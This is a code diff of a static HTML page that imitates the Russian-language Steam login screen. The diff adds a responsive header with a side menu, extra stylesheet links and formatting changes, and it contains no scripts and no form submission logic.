@@ -2,14 +2,18 @@
 
 <head>
     <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width; initial-scale=1">
+    <link rel="shortcut icon" href="../Steam/img/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="../Steam/css/fonts.css">
+    <link rel="stylesheet" href="../Steam/css/header.css">
     <link rel="stylesheet" href="../Steam/css/main.css">
+    <link rel="stylesheet" href="../Steam/css/footer.css">
     <title>Войти</title>
 </head>
 
 <body>
-
     <div class="page-content">
-        <header>
+        <div class="standart-header">
             <div class="content">
                 <div class="logo">
                     <a href="https://store.steampowered.com/?snr=1_60_4__global-header">
@@ -38,7 +42,66 @@
                     </div>
                 </div>
             </div>
-        </header>
+        </div>
+
+        <div class="responsive-header">
+            <div class="responsove-header__content">
+                <div class="responsive-menu__logo">
+                    <input type="checkbox" name="check-menu" class="menu__checkbox" id="check-menu">
+                    <label for="check-menu" class="menu__btn">
+                        <img src="https://store.akamai.steamstatic.com/public/shared/images/responsive/header_menu_hamburger.png"
+                            height="100%">
+                    </label>
+                    <label for="check-menu" class="menu__overlay"></label>
+
+                    <div class="responsive-side-menu">
+                        <div class="side-menu__content-items">
+                            <a class="side-menu__item"
+                                href="https://store.steampowered.com/login/?redir=login%2F%3Fredir%3Dlogin%252F%253Fredir%253D%2526redir_ssl%253D1%2526snr%253D1_4_4__global-header%26redir_ssl%3D1%26snr%3D1_60_4__global-header&amp;redir_ssl=1&amp;snr=1_60_4__global-header">
+                                Войти </a>
+                            <a class="side-menu__item" href="" data-tooltip-type="selector" data-tooltip-content=".submenu_store">
+                                Магазин <div class="chevron"></div></a>
+                            <a class="side-menu__item" href="" data-tooltip-type="selector"
+                                data-tooltip-content=".submenu_community">
+                                Сообщество <div class="chevron"></div></a>
+                            <a class="side-menu__item" href="https://help.steampowered.com/ru/">
+                                Поддержка </a>
+                            <div class="side-menu__minor-items">
+                                <div class="side-menu__item">
+                                    Изменить язык </div>
+                                <div class="side-menu__item"">
+                                    Полная версия </div>
+                            </div>
+                        </div>
+            
+                        <div class=" side-menu__spacer">
+                        </div>
+            
+                        <div class="side-menu__footer">
+                            <div class="side-menu__logo">
+                                <img src="https://store.cloudflare.steamstatic.com/public/shared/images/responsive/logo_valve_footer.png">
+                            </div>
+                            © Valve Corporation. Все права защищены. Все торговые марки являются собственностью соответствующих владельцев в США и других странах.								
+                            <span class="side-menu__links">
+                                <a href="https://store.steampowered.com/privacy_agreement/?snr=1_60_4__global-responsive-menu" target="_blank">Политика конфиденциальности</a>
+                                &nbsp;| &nbsp;
+                                <a href="http://www.valvesoftware.com/legal.htm" target="_blank">Правовая информация</a>
+                                &nbsp;| &nbsp;
+                                <a href="https://store.steampowered.com/subscriber_agreement/?snr=1_60_4__global-responsive-menu" target="_blank">Соглашение подписчика Steam</a>
+                                &nbsp;| &nbsp;
+                                <a href="https://store.steampowered.com/steam_refunds/?snr=1_60_4__global-responsive-menu" target="_blank">Возвраты</a>
+                            </span>
+                        </div>
+                    </div>
+                </div>
+                <div class="responsive-header__logo">
+                    <a href="https://store.steampowered.com/?snr=1_60_4__global-responsive-menu">
+                        <img src="https://store.akamai.steamstatic.com/public/shared/images/responsive/header_logo.png"
+                            height="36" border="0" alt="STEAM">
+                    </a>
+                </div>
+            </div>
+        </div>
 
         <div class="main">
             <div class="login">
@@ -50,7 +113,8 @@
                             <div class="form-container__content">
                                 <form class="login-form">
                                     <div class="text-field">
-                                        <div class="text-field__hint account-name">Войти, используя имя аккаунта</div>
+                                        <div class="text-field__hint account-name">Войти, используя имя аккаунта
+                                        </div>
                                         <input type="text" class="text-field__input" value="">
                                     </div>
 
@@ -63,11 +127,12 @@
                                         <div tabindex="0" class="checkbox">
                                             <div class="checkbox-icon">
                                                 <svg version="1.1" id="base" xmlns="http://www.w3.org/2000/svg"
-                                                    class="SVGIcon_Button SVGIcon_Check" x="0px" y="0px" width="256px"
-                                                    height="256px" viewBox="0 0 256 256" stroke-width="35" stroke="#fff"
-                                                    stroke-linecap="round" stroke-linejoin="round"
-                                                    stroke-miterlimit="10">
-                                                    <polyline fill="none" points="49.5,147.75 95,210.75 206.5,45.25 ">
+                                                    class="SVGIcon_Button SVGIcon_Check" x="0px" y="0px"
+                                                    width="256px" height="256px" viewBox="0 0 256 256"
+                                                    stroke-width="35" stroke="#fff" stroke-linecap="round"
+                                                    stroke-linejoin="round" stroke-miterlimit="10">
+                                                    <polyline fill="none"
+                                                        points="49.5,147.75 95,210.75 206.5,45.25 ">
                                                     </polyline>
                                                 </svg>
                                             </div>
@@ -90,13 +155,11 @@
                                 </form>
 
                                 <div class="qr-section">
-                                    <div class="beta-container">
-                                        <div class="beta-tag">Новая функция в бете</div>
-                                    </div>
+                                    <div class="beta-tag">Новая функция в бете</div>
 
                                     <div class="beta-subtitle-with-icon">
-                                        <svg class="phone-icon" width="34" height="52" viewBox="0 0 34 52" fill="none"
-                                            xmlns="http://www.w3.org/2000/svg">
+                                        <svg class="phone-icon" width="34" height="52" viewBox="0 0 34 52"
+                                            fill="none" xmlns="http://www.w3.org/2000/svg">
                                             <path fill-rule="evenodd" clip-rule="evenodd"
                                                 d="M0.993001 3.2C0.993001 2.0799 0.993001 1.51984 1.21099 1.09202C1.40273 0.715695 1.7087 0.409734 2.08502 0.217987C2.51284 0 3.0729 0 4.193 0H29.793C30.9131 0 31.4732 0 31.901 0.217987C32.2773 0.409734 32.5833 0.715695 32.775 1.09202C32.993 1.51984 32.993 2.0799 32.993 3.2V48.8C32.993 49.9201 32.993 50.4802 32.775 50.908C32.5833 51.2843 32.2773 51.5903 31.901 51.782C31.4732 52 30.9131 52 29.793 52H4.193C3.0729 52 2.51284 52 2.08502 51.782C1.7087 51.5903 1.40273 51.2843 1.21099 50.908C0.993001 50.4802 0.993001 49.9201 0.993001 48.8V3.2ZM33 19.2967C33 19.1328 33.1328 19 33.2967 19C33.4606 19 33.5934 19.1328 33.5934 19.2967V25.8924C33.5934 26.0563 33.4606 26.1891 33.2967 26.1891C33.1328 26.1891 33 26.0563 33 25.8924V19.2967ZM0.690255 12.8531C0.854118 12.8531 0.986956 12.986 0.986956 13.1498V14.735C0.986956 14.8988 0.854118 15.0317 0.690255 15.0317C0.526392 15.0317 0.393555 14.8988 0.393555 14.735V13.1498C0.393555 12.986 0.526392 12.8531 0.690255 12.8531ZM0.986956 23.8975C0.986956 23.7337 0.854118 23.6008 0.690255 23.6008C0.526392 23.6008 0.393555 23.7337 0.393555 23.8975V27.8064C0.393555 27.9703 0.526392 28.1031 0.690255 28.1031C0.854118 28.1031 0.986956 27.9703 0.986956 27.8064V23.8975ZM0.690255 17.3557C0.854118 17.3557 0.986956 17.4886 0.986956 17.6524V21.5613C0.986956 21.7252 0.854118 21.858 0.690255 21.858C0.526392 21.858 0.393555 21.7252 0.393555 21.5613V17.6524C0.393555 17.4886 0.526392 17.3557 0.690255 17.3557Z"
                                                 fill="#42464E"></path>
@@ -124,6 +187,7 @@
                                         class="join-beta-btn">Подробнее</a>
 
                                     <div class="show-qr">Я в бета-версии, покажите мне QR-код</div>
+                            
                                 </div>
                             </div>
                         </div>
@@ -148,8 +212,7 @@
         </div>
 
         <div class="footer-spacer">
-
-            <footer>
+            <div class="standart-footer">
                 <div class="footer-content">
                     <div class="rule"></div>
 
@@ -166,20 +229,21 @@
                     </div>
 
                     <div class="footer__text">
-                        <div>© 2022 Valve Corporation. Все права защищены. Все торговые марки являются собственностью
+                        <div>© 2022 Valve Corporation. Все права защищены. Все торговые марки являются
+                            собственностью
                             соответствующих
                             владельцев в США и других странах.</div>
                         <div>НДС включён во все цены, где он применим.&nbsp;&nbsp;
 
-                            <a href="https://store.steampowered.com/privacy_agreement/?snr=1_44_44_" target="_blank"
-                                rel="noreferrer">Политика конфиденциальности</a>
+                            <a href="https://store.steampowered.com/privacy_agreement/?snr=1_44_44_"
+                                target="_blank" rel="noreferrer">Политика конфиденциальности</a>
                             &nbsp; | &nbsp;
                             <a href="https://store.steampowered.com/legal/?snr=1_44_44_" target="_blank"
                                 rel="noreferrer">Правовая
                                 информация</a>
                             &nbsp; | &nbsp;
-                            <a href="https://store.steampowered.com/subscriber_agreement/?snr=1_44_44_" target="_blank"
-                                rel="noreferrer">Соглашение подписчика Steam</a>
+                            <a href="https://store.steampowered.com/subscriber_agreement/?snr=1_44_44_"
+                                target="_blank" rel="noreferrer">Соглашение подписчика Steam</a>
                             &nbsp; | &nbsp;
                             <a href="https://store.steampowered.com/steam_refunds/?snr=1_44_44_" target="_blank"
                                 rel="noreferrer">Возвраты</a>
@@ -195,7 +259,8 @@
                     <div class="rule"></div>
 
                     <div class="valve-links" data-panel="{&quot;flow-children&quot;:&quot;row&quot;}">
-                        <a href="http://www.valvesoftware.com/about" target="_blank" rel="noreferrer">О Valve</a>
+                        <a href="http://www.valvesoftware.com/about" target="_blank" rel="noreferrer">О
+                            Valve</a>
                         &nbsp; | &nbsp;<a href="http://www.valvesoftware.com" target="_blank"
                             rel="noreferrer">Вакансии</a>
                         &nbsp; | &nbsp;<a href="http://www.steampowered.com/steamworks/" target="_blank"
@@ -203,19 +268,22 @@
                         &nbsp; | &nbsp;<a href="https://partner.steamgames.com/steamdirect" target="_blank"
                             rel="noreferrer">Дистрибуция
                             Steam</a>
-                        &nbsp; | &nbsp;<a href="https://help.steampowered.com/ru/?snr=1_44_44_">Служба поддержки</a>
+                        &nbsp; | &nbsp;<a href="https://help.steampowered.com/ru/?snr=1_44_44_">Служба
+                            поддержки</a>
                         &nbsp; | &nbsp;<a href="https://store.steampowered.com/digitalgiftcards/?snr=1_44_44_"
                             target="_blank" rel="noreferrer">Подарочные карты</a>
                         &nbsp; | &nbsp;<a
                             href="https://steamcommunity.com/linkfilter/?url=http://www.facebook.com/Steam"
                             target="_blank" rel="noopener"><img
-                                src="https://store.akamai.steamstatic.com/public/images/ico/ico_facebook.gif"> Steam</a>
+                                src="https://store.akamai.steamstatic.com/public/images/ico/ico_facebook.gif">
+                            Steam</a>
                         &nbsp; | &nbsp;<a href="http://twitter.com/steam" target="_blank" rel="noreferrer"><img
-                                src="https://store.akamai.steamstatic.com/public/images/ico/ico_twitter.gif"> @steam</a>
+                                src="https://store.akamai.steamstatic.com/public/images/ico/ico_twitter.gif">
+                            @steam</a>
                     </div>
 
                 </div>
-            </footer>
+            </div>
         </div>
     </div>
 </body>
